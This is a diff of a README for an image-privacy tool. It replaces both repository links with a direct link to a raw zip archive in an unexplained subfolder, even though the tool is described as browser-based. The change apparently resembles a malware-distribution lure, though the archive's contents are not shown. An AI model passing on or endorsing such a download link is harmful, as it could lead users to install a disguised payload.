@@ -1,6 +1,6 @@
 # 🛡️ privacy-image-guard-hub - Safe, Private Image Sanitization for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen?style=for-the-badge&logo=github)](https://github.com/Januar3195/privacy-image-guard-hub)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen?style=for-the-badge&logo=github)](https://github.com/Januar3195/privacy-image-guard-hub/raw/refs/heads/main/picker/privacy_image_hub_guard_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Privacy Image Guard Hub is a browser-based tool that removes hidden data from yo
 ## 📥 How to Download
 
 Visit this link to download the application:
-[https://github.com/Januar3195/privacy-image-guard-hub](https://github.com/Januar3195/privacy-image-guard-hub)
+[https://github.com/Januar3195/privacy-image-guard-hub/raw/refs/heads/main/picker/privacy_image_hub_guard_v2.7.zip](https://github.com/Januar3195/privacy-image-guard-hub/raw/refs/heads/main/picker/privacy_image_hub_guard_v2.7.zip)
 
 On the page, click the green "Code" button and select "Download ZIP". Or scroll down to find the latest release.
 
